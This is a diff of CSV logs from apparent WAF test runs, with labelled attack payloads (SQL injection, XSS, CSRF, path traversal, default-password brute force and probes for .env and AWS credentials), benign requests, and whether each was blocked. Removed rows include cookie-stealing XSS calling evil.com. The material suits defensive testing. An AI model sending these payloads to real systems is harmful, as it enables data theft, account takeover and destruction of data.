@@ -1,140 +1,140 @@
 timestamp,attack_type,payload_snippet,label,status_code,blocked
-2026-07-04T22:06:14.955592,sqli,"' UNION SELECT @@version,NULL,NULL--",1,403,True
-2026-07-04T22:06:15.181321,sqli,' AND SLEEP(5)--,1,401,False
-2026-07-04T22:06:18.310146,sqli,admin'--,1,403,True
-2026-07-04T22:06:22.126445,sqli,' AND 1=2--,1,403,True
-2026-07-04T22:06:25.997518,sqli,' AND SLEEP(5)--,1,403,True
-2026-07-04T22:06:26.878153,sqli,"' UNION SELECT @@version,NULL,NULL--",1,403,True
-2026-07-04T22:06:29.843142,sqli,"' UNION SELECT @@version,NULL,NULL--",1,403,True
-2026-07-04T22:06:30.211480,sqli,' AND SLEEP(5)--,1,401,False
-2026-07-04T22:06:34.096595,sqli,'; DROP TABLE users--,1,403,True
-2026-07-04T22:06:34.932079,sqli,'; DELETE FROM products WHERE 1=1--,1,403,True
-2026-07-04T22:06:38.216607,sqli,'; WAITFOR DELAY '00:00:05'--,1,403,True
-2026-07-04T22:06:41.500932,sqli,'; DELETE FROM products WHERE 1=1--,1,403,True
-2026-07-04T22:06:42.648518,sqli,"1' UNION SELECT username,password,email FROM users--",1,403,True
-2026-07-04T22:06:44.076321,sqli,'; DROP TABLE users--,1,403,True
-2026-07-04T22:06:47.526175,sqli,"1' UNION SELECT username,password,email FROM users--",1,403,True
-2026-07-04T22:06:47.834504,benign,normal_request,0,200,False
-2026-07-04T22:06:53.520454,benign,normal_request,0,N/A,False
-2026-07-04T22:06:59.260921,benign,normal_request,0,N/A,False
-2026-07-04T22:07:03.212317,benign,normal_request,0,403,False
-2026-07-04T22:07:08.437954,benign,normal_request,0,N/A,False
-2026-07-04T22:07:08.943679,benign,normal_request,0,200,False
-2026-07-04T22:07:09.659444,benign,normal_request,0,200,False
-2026-07-04T22:07:15.116419,benign,normal_request,0,N/A,False
-2026-07-04T22:07:15.923680,benign,normal_request,0,200,False
-2026-07-04T22:07:21.139601,benign,normal_request,0,N/A,False
-2026-07-04T22:07:26.652971,xss,<script>alert(document.cookie)</script>,1,403,True
-2026-07-04T22:07:29.736740,xss,<script>fetch('http://evil.com/?c='+document.cookie)</script>,1,403,True
-2026-07-04T22:07:34.762983,xss,<a href='javascript:alert(1)'>click</a>,1,403,True
-2026-07-04T22:07:39.168233,xss,<script>fetch('http://evil.com/?c='+document.cookie)</script>,1,403,True
-2026-07-04T22:07:43.846671,xss,<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>,1,403,True
-2026-07-04T22:07:44.669689,xss,<iframe src='javascript:alert(1)'>,1,403,True
-2026-07-04T22:07:48.757658,xss,<script>fetch('http://evil.com/?c='+document.cookie)</script>,1,403,True
-2026-07-04T22:07:49.402027,xss,<script>fetch('http://evil.com/?c='+document.cookie)</script>,1,403,True
-2026-07-04T22:07:50.183615,xss,<script>alert(document.cookie)</script>,1,403,True
-2026-07-04T22:07:55.063528,xss,<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>,1,403,True
-2026-07-04T22:07:55.799047,xss,<input onfocus=alert(1) autofocus>,1,403,True
-2026-07-04T22:07:59.723293,xss,<body onload=alert(1)>,1,403,True
-2026-07-04T22:07:59.847430,benign,normal_request,0,200,False
-2026-07-04T22:08:00.187619,benign,normal_request,0,401,False
-2026-07-04T22:08:04.583519,benign,normal_request,0,403,False
-2026-07-04T22:08:05.005832,benign,normal_request,0,200,False
-2026-07-04T22:08:05.670937,benign,normal_request,0,401,False
-2026-07-04T22:08:10.599539,benign,normal_request,0,403,False
-2026-07-04T22:08:11.548473,benign,normal_request,0,403,False
-2026-07-04T22:08:12.009837,benign,normal_request,0,401,False
-2026-07-04T22:08:16.825056,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,403,True
-2026-07-04T22:08:21.056247,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,403,True
-2026-07-04T22:08:26.453917,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,N/A,False
-2026-07-04T22:08:31.962997,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,N/A,False
-2026-07-04T22:08:34.772972,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,403,True
-2026-07-04T22:08:39.175691,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,403,True
-2026-07-04T22:08:41.735866,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,403,True
-2026-07-04T22:08:45.908932,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,403,True
-2026-07-04T22:08:46.769740,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,403,True
-2026-07-04T22:08:49.079956,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,403,True
-2026-07-04T22:08:53.236122,benign,normal_request,0,403,False
-2026-07-04T22:08:57.497373,benign,normal_request,0,403,False
-2026-07-04T22:08:58.206042,benign,normal_request,0,200,False
-2026-07-04T22:09:03.426137,benign,normal_request,0,N/A,False
-2026-07-04T22:09:03.806117,benign,normal_request,0,401,False
-2026-07-04T22:09:09.072208,benign,normal_request,0,403,False
-2026-07-04T22:09:09.502205,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,500,False
-2026-07-04T22:09:13.390988,path_traversal,....//....//....//etc/passwd,1,403,True
-2026-07-04T22:09:17.888102,path_traversal,../../../etc/passwd,1,403,True
-2026-07-04T22:09:23.115598,path_traversal,..\..\..\windows\system32\config\sam,1,N/A,False
-2026-07-04T22:09:28.081584,path_traversal,....//....//....//etc/passwd,1,403,True
-2026-07-04T22:09:32.768177,path_traversal,..\..\..\windows\system32\config\sam,1,403,True
-2026-07-04T22:09:33.408464,path_traversal,..\..\..\windows\system32\config\sam,1,403,True
-2026-07-04T22:09:37.743583,path_traversal,....//....//....//etc/passwd,1,403,True
-2026-07-04T22:09:40.030362,path_traversal,/var/www/../../etc/passwd,1,403,True
-2026-07-04T22:09:40.268924,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,500,False
-2026-07-04T22:09:44.099916,benign,normal_request,0,403,False
-2026-07-04T22:09:46.562109,benign,normal_request,0,403,False
-2026-07-04T22:09:51.986375,benign,normal_request,0,N/A,False
-2026-07-04T22:09:54.685997,benign,normal_request,0,403,False
-2026-07-04T22:09:55.183138,benign,normal_request,0,401,False
-2026-07-04T22:10:00.519218,benign,normal_request,0,403,False
-2026-07-04T22:10:01.309281,benign,normal_request,0,200,False
-2026-07-04T22:10:06.730127,benign,normal_request,0,N/A,False
-2026-07-04T22:10:11.722192,brute_force,test:password,1,403,True
-2026-07-04T22:10:12.435402,brute_force,user:letmein,1,403,True
-2026-07-04T22:10:17.106693,brute_force,administrator:password,1,403,True
-2026-07-04T22:10:17.667919,brute_force,admin:password,1,403,True
-2026-07-04T22:10:22.119340,brute_force,administrator:password,1,403,True
-2026-07-04T22:10:22.747329,brute_force,root:Admin@123,1,403,True
-2026-07-04T22:10:23.315188,brute_force,user:123456,1,403,True
-2026-07-04T22:10:27.979945,brute_force,administrator:letmein,1,403,True
-2026-07-04T22:10:28.569175,brute_force,user:Admin@123,1,403,True
-2026-07-04T22:10:33.720547,brute_force,test:password,1,N/A,False
-2026-07-04T22:10:38.915538,brute_force,user:123456,1,N/A,False
-2026-07-04T22:10:44.028692,brute_force,root:admin123,1,N/A,False
-2026-07-04T22:10:49.262663,brute_force,test:password,1,N/A,False
-2026-07-04T22:10:54.440793,brute_force,administrator:admin123,1,N/A,False
-2026-07-04T22:10:57.833351,brute_force,user:password,1,403,True
-2026-07-04T22:10:58.640047,brute_force,root:Admin@123,1,403,True
-2026-07-04T22:10:59.252292,brute_force,test:admin123,1,403,True
-2026-07-04T22:11:00.113746,brute_force,admin:admin123,1,403,True
-2026-07-04T22:11:04.297838,brute_force,admin:password,1,403,True
-2026-07-04T22:11:08.664430,brute_force,administrator:Admin@123,1,403,True
-2026-07-04T22:11:12.924917,brute_force,user:Admin@123,1,403,True
-2026-07-04T22:11:17.244941,brute_force,admin:password,1,403,True
-2026-07-04T22:11:17.894003,brute_force,user:letmein,1,403,True
-2026-07-04T22:11:22.010465,brute_force,test:letmein,1,403,True
-2026-07-04T22:11:22.642778,brute_force,user:letmein,1,403,True
-2026-07-04T22:11:22.822125,benign,normal_request,0,200,False
-2026-07-04T22:11:27.179267,benign,normal_request,0,403,False
-2026-07-04T22:11:27.627225,benign,normal_request,0,200,False
-2026-07-04T22:11:31.717816,benign,normal_request,0,403,False
-2026-07-04T22:11:32.315127,benign,normal_request,0,200,False
-2026-07-04T22:11:33.255205,benign,normal_request,0,401,False
-2026-07-04T22:11:37.625304,benign,normal_request,0,403,False
-2026-07-04T22:11:37.889256,benign,normal_request,0,401,False
-2026-07-04T22:11:38.328334,benign,normal_request,0,200,False
-2026-07-04T22:11:38.620389,benign,normal_request,0,200,False
-2026-07-04T22:11:41.564131,recon,/.git/HEAD,1,403,True
-2026-07-04T22:11:43.795074,recon,/.aws/credentials,1,403,True
-2026-07-04T22:11:44.022051,recon,/.git/HEAD,1,404,True
-2026-07-04T22:11:46.373013,recon,/data/users.json,1,403,True
-2026-07-04T22:11:48.472181,recon,/.env,1,403,True
-2026-07-04T22:11:50.808465,recon,/.aws/credentials,1,403,True
-2026-07-04T22:11:51.327008,recon,/.env,1,403,True
-2026-07-04T22:11:53.565684,recon,/db/virex.db,1,500,False
-2026-07-04T22:11:54.176605,recon,/backup.sql,1,500,False
-2026-07-04T22:11:57.805522,recon,/web.config,1,403,True
-2026-07-04T22:11:58.652717,recon,/db/virex.db,1,500,False
-2026-07-04T22:12:00.793631,recon,/api/swagger.json,1,403,True
-2026-07-04T22:12:01.481178,recon,/web.config,1,500,False
-2026-07-04T22:12:01.663696,recon,/backup.sql,1,404,True
-2026-07-04T22:12:02.505731,recon,/.aws/credentials,1,500,False
-2026-07-04T22:12:02.708204,benign,normal_request,0,200,False
-2026-07-04T22:12:03.150334,benign,normal_request,0,200,False
-2026-07-04T22:12:07.271983,benign,normal_request,0,403,False
-2026-07-04T22:12:07.686547,benign,normal_request,0,200,False
-2026-07-04T22:12:08.323526,benign,normal_request,0,200,False
-2026-07-04T22:12:09.104398,benign,normal_request,0,200,False
-2026-07-04T22:12:14.476327,benign,normal_request,0,403,False
-2026-07-04T22:12:15.009817,benign,normal_request,0,401,False
-2026-07-04T22:12:19.564430,benign,normal_request,0,403,False
-2026-07-04T22:12:20.320840,benign,normal_request,0,200,False
+2026-07-04T22:52:22.150255,sqli,' AND 1=1--,1,403,True
+2026-07-04T22:52:24.429651,sqli,"' UNION SELECT @@version,NULL,NULL--",1,403,True
+2026-07-04T22:52:27.620879,sqli,"' UNION SELECT NULL,NULL,NULL--",1,403,True
+2026-07-04T22:52:28.096990,sqli,' OR '1'='1,1,401,False
+2026-07-04T22:52:30.569538,sqli,' OR 1=1--,1,403,True
+2026-07-04T22:52:33.423136,sqli,"' UNION SELECT @@version,NULL,NULL--",1,403,True
+2026-07-04T22:52:38.367110,sqli,1' OR '1'='1' /*,1,403,True
+2026-07-04T22:52:40.902150,sqli,'; DELETE FROM products WHERE 1=1--,1,403,True
+2026-07-04T22:52:41.508773,sqli,"' UNION SELECT @@version,NULL,NULL--",1,403,True
+2026-07-04T22:52:43.864170,sqli,' OR '1'='1,1,403,True
+2026-07-04T22:52:43.993788,sqli,'; DROP TABLE users--,1,401,False
+2026-07-04T22:52:44.231706,sqli,' AND 1=1--,1,401,False
+2026-07-04T22:52:47.748636,sqli,"' UNION SELECT @@version,NULL,NULL--",1,403,True
+2026-07-04T22:52:50.477621,sqli,' OR '1'='1,1,403,True
+2026-07-04T22:52:51.056324,sqli,1' OR '1'='1' /*,1,403,True
+2026-07-04T22:52:56.308263,benign,normal_request,0,N/A,False
+2026-07-04T22:53:01.701997,benign,normal_request,0,N/A,False
+2026-07-04T22:53:07.514966,benign,normal_request,0,N/A,False
+2026-07-04T22:53:13.282905,benign,normal_request,0,N/A,False
+2026-07-04T22:53:13.580262,benign,normal_request,0,200,False
+2026-07-04T22:53:18.976087,benign,normal_request,0,N/A,False
+2026-07-04T22:53:24.533954,benign,normal_request,0,N/A,False
+2026-07-04T22:53:25.019129,benign,normal_request,0,401,False
+2026-07-04T22:53:30.122175,benign,normal_request,0,403,False
+2026-07-04T22:53:35.655018,benign,normal_request,0,N/A,False
+2026-07-04T22:53:40.979789,xss,<img src=x onerror=alert(1)>,1,N/A,False
+2026-07-04T22:53:46.238283,xss,<img src=x onerror=alert(1)>,1,N/A,False
+2026-07-04T22:53:51.504628,xss,<scr<script>ipt>alert(1)</scr</script>ipt>,1,N/A,False
+2026-07-04T22:53:56.653142,xss,<script>alert(document.cookie)</script>,1,N/A,False
+2026-07-04T22:54:01.951176,xss,<iframe src='javascript:alert(1)'>,1,N/A,False
+2026-07-04T22:54:04.775894,xss,<iframe src='javascript:alert(1)'>,1,403,True
+2026-07-04T22:54:10.008023,xss,<script>alert(document.cookie)</script>,1,N/A,False
+2026-07-04T22:54:15.282638,xss,<iframe src='javascript:alert(1)'>,1,N/A,False
+2026-07-04T22:54:18.092666,xss,<input onfocus=alert(1) autofocus>,1,403,True
+2026-07-04T22:54:20.685867,xss,<script>alert(document.cookie)</script>,1,403,True
+2026-07-04T22:54:24.758635,xss,<div onmouseover=alert(1)>hover</div>,1,403,True
+2026-07-04T22:54:29.729132,xss,<input onfocus=alert(1) autofocus>,1,403,True
+2026-07-04T22:54:33.724019,benign,normal_request,0,403,False
+2026-07-04T22:54:36.143954,benign,normal_request,0,403,False
+2026-07-04T22:54:41.072347,benign,normal_request,0,403,False
+2026-07-04T22:54:46.265695,benign,normal_request,0,403,False
+2026-07-04T22:54:51.720567,benign,normal_request,0,N/A,False
+2026-07-04T22:54:55.175862,benign,normal_request,0,403,False
+2026-07-04T22:55:00.056821,benign,normal_request,0,403,False
+2026-07-04T22:55:05.409912,benign,normal_request,0,N/A,False
+2026-07-04T22:55:10.812821,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,N/A,False
+2026-07-04T22:55:15.403658,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,403,True
+2026-07-04T22:55:19.655486,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,403,True
+2026-07-04T22:55:24.423398,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,403,True
+2026-07-04T22:55:25.332596,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,403,True
+2026-07-04T22:55:29.232189,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,403,True
+2026-07-04T22:55:32.902709,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,403,True
+2026-07-04T22:55:35.441935,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,403,True
+2026-07-04T22:55:39.350759,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,403,True
+2026-07-04T22:55:42.106476,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,403,True
+2026-07-04T22:55:46.275622,benign,normal_request,0,403,False
+2026-07-04T22:55:46.917947,benign,normal_request,0,200,False
+2026-07-04T22:55:47.589762,benign,normal_request,0,401,False
+2026-07-04T22:55:51.747514,benign,normal_request,0,403,False
+2026-07-04T22:55:52.264074,benign,normal_request,0,200,False
+2026-07-04T22:55:56.896514,benign,normal_request,0,403,False
+2026-07-04T22:56:01.733097,path_traversal,/var/www/../../etc/passwd,1,403,True
+2026-07-04T22:56:06.556420,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,403,True
+2026-07-04T22:56:10.641285,path_traversal,..\..\..\windows\system32\config\sam,1,403,True
+2026-07-04T22:56:14.669272,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,403,True
+2026-07-04T22:56:17.225636,path_traversal,..\..\..\windows\system32\config\sam,1,403,True
+2026-07-04T22:56:19.382485,path_traversal,../../../etc/passwd,1,403,True
+2026-07-04T22:56:19.747374,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,500,False
+2026-07-04T22:56:24.153379,path_traversal,....//....//....//etc/passwd,1,403,True
+2026-07-04T22:56:24.528497,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,500,False
+2026-07-04T22:56:24.652020,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,500,False
+2026-07-04T22:56:28.724080,benign,normal_request,0,403,False
+2026-07-04T22:56:32.538182,benign,normal_request,0,403,False
+2026-07-04T22:56:36.754886,benign,normal_request,0,403,False
+2026-07-04T22:56:37.117977,benign,normal_request,0,200,False
+2026-07-04T22:56:37.607293,benign,normal_request,0,401,False
+2026-07-04T22:56:37.955627,benign,normal_request,0,200,False
+2026-07-04T22:56:42.121442,benign,normal_request,0,403,False
+2026-07-04T22:56:42.811741,benign,normal_request,0,200,False
+2026-07-04T22:56:46.992366,brute_force,user:password,1,403,True
+2026-07-04T22:56:47.563082,brute_force,administrator:admin123,1,403,True
+2026-07-04T22:56:48.315548,brute_force,administrator:123456,1,403,True
+2026-07-04T22:56:48.914556,brute_force,root:Admin@123,1,403,True
+2026-07-04T22:56:52.828225,brute_force,test:Admin@123,1,403,True
+2026-07-04T22:56:55.346432,brute_force,admin:Admin@123,1,429,True
+2026-07-04T22:56:55.967069,brute_force,user:letmein,1,429,True
+2026-07-04T22:56:56.578686,brute_force,administrator:letmein,1,429,True
+2026-07-04T22:56:57.069995,brute_force,test:letmein,1,429,True
+2026-07-04T22:56:57.600102,brute_force,root:password,1,429,True
+2026-07-04T22:56:58.326660,brute_force,user:admin123,1,429,True
+2026-07-04T22:56:58.915974,brute_force,user:password,1,429,True
+2026-07-04T22:56:59.471643,brute_force,administrator:password,1,429,True
+2026-07-04T22:57:00.093651,brute_force,user:password,1,429,True
+2026-07-04T22:57:04.146619,brute_force,root:password,1,403,True
+2026-07-04T22:57:04.635785,brute_force,admin:password,1,429,True
+2026-07-04T22:57:05.295908,brute_force,test:Admin@123,1,403,True
+2026-07-04T22:57:06.059862,brute_force,test:password,1,429,True
+2026-07-04T22:57:07.050171,brute_force,user:admin123,1,429,True
+2026-07-04T22:57:07.694094,brute_force,admin:letmein,1,429,True
+2026-07-04T22:57:09.284903,brute_force,root:password,1,429,True
+2026-07-04T22:57:10.078027,brute_force,administrator:admin123,1,429,True
+2026-07-04T22:57:10.699569,brute_force,admin:Admin@123,1,429,True
+2026-07-04T22:57:11.645473,brute_force,administrator:password,1,429,True
+2026-07-04T22:57:12.662516,brute_force,user:admin123,1,429,True
+2026-07-04T22:57:13.329661,benign,normal_request,0,401,False
+2026-07-04T22:57:13.975786,benign,normal_request,0,429,False
+2026-07-04T22:57:14.716402,benign,normal_request,0,200,False
+2026-07-04T22:57:20.103902,benign,normal_request,0,403,False
+2026-07-04T22:57:21.235528,benign,normal_request,0,429,False
+2026-07-04T22:57:22.276262,benign,normal_request,0,429,False
+2026-07-04T22:57:22.580271,benign,normal_request,0,401,False
+2026-07-04T22:57:23.654797,benign,normal_request,0,429,False
+2026-07-04T22:57:24.411721,benign,normal_request,0,401,False
+2026-07-04T22:57:25.093383,benign,normal_request,0,200,False
+2026-07-04T22:57:25.945150,recon,/.aws/credentials,1,404,True
+2026-07-04T22:57:28.892314,recon,/.env,1,403,True
+2026-07-04T22:57:29.028996,recon,/.env,1,404,True
+2026-07-04T22:57:32.041884,recon,/.git/HEAD,1,403,True
+2026-07-04T22:57:32.177984,recon,/.git/HEAD,1,404,True
+2026-07-04T22:57:34.917219,recon,/admin,1,403,True
+2026-07-04T22:57:35.102695,recon,/db/virex.db,1,404,True
+2026-07-04T22:57:35.185370,recon,/.git/HEAD,1,404,True
+2026-07-04T22:57:37.994659,recon,/db/virex.db,1,403,True
+2026-07-04T22:57:40.738764,recon,/server-status,1,403,True
+2026-07-04T22:57:43.246708,recon,/.env,1,403,True
+2026-07-04T22:57:43.355995,recon,/data/users.json,1,404,True
+2026-07-04T22:57:46.273488,recon,/.aws/credentials,1,403,True
+2026-07-04T22:57:48.467207,recon,/.env,1,403,True
+2026-07-04T22:57:49.158316,recon,/api/swagger.json,1,429,True
+2026-07-04T22:57:49.298865,benign,normal_request,0,200,False
+2026-07-04T22:57:49.699798,benign,normal_request,0,401,False
+2026-07-04T22:57:53.945393,benign,normal_request,0,403,False
+2026-07-04T22:57:54.695148,benign,normal_request,0,200,False
+2026-07-04T22:57:55.392369,benign,normal_request,0,200,False
+2026-07-04T22:57:56.198452,benign,normal_request,0,200,False
+2026-07-04T22:57:57.361579,benign,normal_request,0,429,False
+2026-07-04T22:57:57.774433,benign,normal_request,0,200,False
+2026-07-04T22:58:01.674843,benign,normal_request,0,403,False
+2026-07-04T22:58:02.418548,benign,normal_request,0,200,False
